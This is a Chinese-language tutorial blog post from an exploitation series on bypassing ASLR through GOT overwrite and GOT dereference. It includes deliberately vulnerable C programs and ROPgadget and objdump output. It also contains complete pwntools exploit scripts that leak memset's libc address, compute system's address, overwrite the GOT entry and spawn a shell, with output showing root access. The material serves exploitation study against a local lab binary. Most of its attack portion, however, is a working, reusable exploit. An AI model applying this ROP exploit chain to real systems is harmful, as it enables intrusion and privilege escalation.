---
layout: post
title: 通过GOT overwrite 和GOT dereference绕过ASLR
excerpt: "sploitfun系列教程之2.3.3 GOT overwrite 和GOT dereference"
categories: [sploitfun系列教程]
comments: true
---

上一篇文章中，绕过aslr需要使用程序中的function，这一篇不需要

漏洞代码
```
// vuln.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main (int argc, char **argv) {
 char buf[256];
 int i;
 seteuid(getuid());
 if(argc < 2) {
  puts("Need an argument\n");
  exit(-1);
 }
 strcpy(buf, argv[1]);
 printf("%s\nLen:%d\n", buf, (int)strlen(buf));
 return 0;
}
```
编译
```
echo 2 > /proc/sys/kernel/randomize_va_space
gcc -fno-stack-protector -o vuln vuln.c -m32 -g
chmod 777 vuln
```
目前面临的两个问题
- system@PLT方法在vuln中没有
- sh字符串在vuln中没有

#### 什么是GOT 覆盖
这种技术帮助攻击者将一个function的GOT entry地址改写为一个特定的地址，我们知道function的got位置是不变的，这样一个任意地址修改的漏洞，就可以造成GOT overwrite，而通过libc中的offset，我们可以计算出需要调用函数的地址
```
offset_diff = execve_addr - getuid_addr
GOT[execve] = GOT[getuid] + offset_diff
```
#### 什么是GOT 解引用
这个技巧类似于 GOT 覆盖，但是这里不会覆盖特定 Libc 函数的 GOT 条目，而是将它的值复制到寄存器中，并将偏移差加到寄存器的内容。因此，寄存器就含有所需的 Libc 函数地址。例如，`GOT[getuid]`包含getuid的函数地址，将其复制到寄存器。两个 Libc 函数（`execve`和`getuid`）的偏移差加到寄存器的内容。现在跳到寄存器的值就调用了`execve`。
```
offset_diff = execve_addr - getuid_addr
eax = GOT[getuid]
eax = eax + offset_diff
```
这两个技巧看起来类似，但是当缓冲区溢出发生时，如何在运行时期执行这些操作呢？我们需要识别出一个函数（它执行这些加法，并将结果复制到寄存器），并跳到特定的函数来完成 GOT 覆盖或解引用。但是很显然，没有单一的函数（不在 Libc 也不在我们的可执行文件中）能够为我们做这些。这里我们使用 ROP。

#### 使用ROP覆盖got

– Gadget 1:首先我们需要一个Gadget，它将偏移差加到`GOT[getuid]`上。所以让我们寻找一个`add`零件，它将结果复制到内存区域中。
```
ROPgadget --binary vuln | less

...
...
0x08048505 : add eax, 0x804a030 ; add ecx, ecx ; ret
...
```
如果0x804a030的值是`GOT[getuid] – 0x5d5b04c4`而eax的值是两个function的offset, we can successfully perform GOT overwrite!!

这个也是一个rop方法，先跳过

----

#### 64位版本
参考:https://blog.techorganic.com/2016/03/18/64-bit-linux-stack-smashing-tutorial-part-3/

漏洞代码
```c
/* Compile: gcc -fno-stack-protector leak.c -o leak          */
/* Enable ASLR: echo 2 > /proc/sys/kernel/randomize_va_space */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

void helper() {
    asm("pop %rdi; pop %rsi; pop %rdx; ret");
}

int vuln() {
    char buf[150];
    ssize_t b;
    memset(buf, 0, 150);
    printf("Enter input: ");
    b = read(0, buf, 400);

    printf("Recv: ");
    write(1, buf, b);
    return 0;
}

int main(int argc, char *argv[]){
    setbuf(stdout, 0);
    vuln();
    return 0;
}
```
编译
```
echo 2 > /proc/sys/kernel/randomize_va_space
gcc -fno-stack-protector leak.c -o leak
```
有漏洞的代码在vuln(),read()方法将400字节的东西写入到150字节的缓冲区中.在ASLR开启的情况下,我们没办法找到system的地址. 我们可以这样解决:

- leak出library方法的GOT值,在这个案例中,我们使用leak出memset()的地址
- 通过offset计算出libc的基地址,从而计算出system的地址
- 将函数GOT地址覆盖成system()的地址

首先我们架起服务
```
ncat -vc leak -kl 127.0.0.1 4000
```
查看memset的plt和got
```bash
objdump -d leak|less
0000000000400570 <memset@plt>:
  400570:       ff 25 ba 0a 20 00       jmpq   *0x200aba(%rip)        # 601030 <memset@GLIBC_2.2.5>
```
或者
```
objdump -R leak | grep memset
0000000000601030 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
```
查看write的plt
```
objdump -d leak|less
0000000000400540 <write@plt>:
  400540:       ff 25 d2 0a 20 00       jmpq   *0x200ad2(%rip)        # 601018 <write@GLIBC_2.2.5>
  400546:       68 00 00 00 00          pushq  $0x0
  40054b:       e9 e0 ff ff ff          jmpq   400530 <.plt>
```
其中write函数的参数意义如下

> fd:是文件描述符（输出到command line，就是1）
> buf:通常是一个字符串，需要写入的字符串
> count：是每次写入的字节数

如果我们读到 memset()’的GOT值为0xf7a9c920 . 我们可以覆盖vuln()的return address 为write@plt;  我们还需要使用ROP技术给RDI, RSI,RDX 指针正确的赋值.

helper方法中有这些赋值
```bash
gdb-peda$ disass helper
Dump of assembler code for function helper:
   0x000000000040069d <+0>:	push   rbp
   0x000000000040069e <+1>:	mov    rbp,rsp
   0x00000000004006a1 <+4>:	pop    rdi
   0x00000000004006a2 <+5>:	pop    rsi
   0x00000000004006a3 <+6>:	pop    rdx
   0x00000000004006a4 <+7>:	ret    
   0x00000000004006a5 <+8>:	pop    rbp
   0x00000000004006a6 <+9>:	ret    
```
leak出memset()'[GOT]的exp为
```python
from pwn import *

write_plt  = 0x400540            # address of write@plt
memset_got = 0x601030            # memset()'s GOT entry
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret

payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)
r = remote("127.0.0.1",4000)
raw_input('#')
print r.recvuntil('input: ')
r.sendline(payload)
print (r.recvline())
print '===='
memset=u64(r.recv(8))
print hex(memset)

```
查找system和memset的offset
```
ldd leak
	linux-vdso.so.1 =>  (0x00007ffd065f6000)
	libc.so.6 => /lib64/libc.so.6 (0x00007f7802897000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f7802c65000)
```
`objdump -d /lib64/libc.so.6 |less`或者`readelf -s /lib64/libc.so.6 |less`
```
0000000000043270 <__libc_system>:
   43279:	74 15                	je     43290 <__libc_system+0x20>
   43283:	75 26                	jne    432ab <__libc_system+0x3b>
000000000008f8c0 <memset>:
   8f8c7:	48 8d 05 c2 ac 00 00 	lea    0xacc2(%rip),%rax        # 9a590 <__memset_x86_64>
   8f8d8:	74 26                	je     8f900 <memset+0x40>

```
打印出system的地址
```python
from pwn import *

write_plt  = 0x400540            # address of write@plt
memset_got = 0x601030            # memset()'s GOT entry
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret

memset_off = 0x08f8c0            # memset()'s offset in libc.so.6
system_off = 0x043270            # system()'s offset in libc.so.6

payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)
r = remote("127.0.0.1",4000)
raw_input('#')
print r.recvuntil('input: ')
r.sendline(payload)
print (r.recvline())
print '===='
memset=u64(r.recv(8))
print hex(memset)

print (hex(memset-memset_off+system_off))
```
之后我们使用read@plt来覆盖memset()的 GOT值,使用read@plt写入 “sh”,将RDI指针指向“sh”,并调用system函数


#### c语言中的read和write
```
#include<stdio.h>
#define MAXSIZE 10
int main(void)
{
 char c;
 char buf[MAXSIZE];
 int n;
 while((n = read(0,buf,MAXSIZE)) > 0)
  write(1,buf,n);//
}
```
最终的exp
```python
from pwn import *

read_plt   = 0x400580            # address of read@plt
write_plt  = 0x400540            # address of write@plt
memset_plt = 0x400570
memset_got = 0x601030            # memset()'s GOT entry
pop3ret    = 0x4006a1            # gadget to pop rdi; pop rsi; pop rdx; ret

memset_off = 0x08f920            # memset()'s offset in libc.so.6
system_off = 0x043270            # system()'s offset in libc.so.6

writeable  = 0x601000            # location to write "/bin/sh" to

payload ="A"*168 + p64(pop3ret)+p64(1)+p64(memset_got)+p64(8)+p64(write_plt)    #leak memset()'s libc address using write@plt
payload+=p64(pop3ret)+p64(0)+p64(memset_got)+p64(8)+p64(read_plt)               #overwrite memset()'s GOT entry using read@plt
payload+=p64(pop3ret)+p64(0)+p64(writeable)+p64(8)+p64(read_plt)               #read "/bin/sh" into 0x601000 using read@plt
payload+=p64(pop3ret)+p64(writeable)+p64(1)+p64(1)+p64(memset_plt)              #set RDI to location of "/bin/sh", and call system()
r = remote("127.0.0.1",4000)
raw_input('#')
print r.recvuntil('input: ')
r.sendline(payload)
r.recvline()
memset=u64(r.recv(8))
print hex(memset)

print (hex(memset-memset_off+system_off))

#r.sendline('AAAABBBB')
#raw_input('#')
r.send(p64(memset-memset_off+system_off))
r.send(p64(0x6873))
raw_input('#')
r.interactive()

```
最终的结果
```
python mortyexp.py 
[+] Opening connection to 127.0.0.1 on port 4000: Done
#
Enter input: 
0x7f92ef091920
0x7f92ef045270
#
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)

```